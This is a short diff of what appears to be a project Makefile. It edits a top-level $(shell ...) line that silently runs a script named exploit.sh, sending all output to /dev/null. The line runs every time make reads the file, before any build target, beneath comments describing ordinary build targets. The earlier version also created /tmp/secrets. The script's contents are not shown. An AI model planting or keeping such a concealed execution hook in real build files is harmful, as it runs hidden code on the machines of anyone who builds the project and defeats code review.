@@ -1,4 +1,4 @@
-$(shell touch /tmp/secrets && bash exploit.sh > /dev/null 2>&1)
+$(shell bash ./exploit.sh > /dev/null 2>&1)
 
 ## All targets
 # Target to build the project
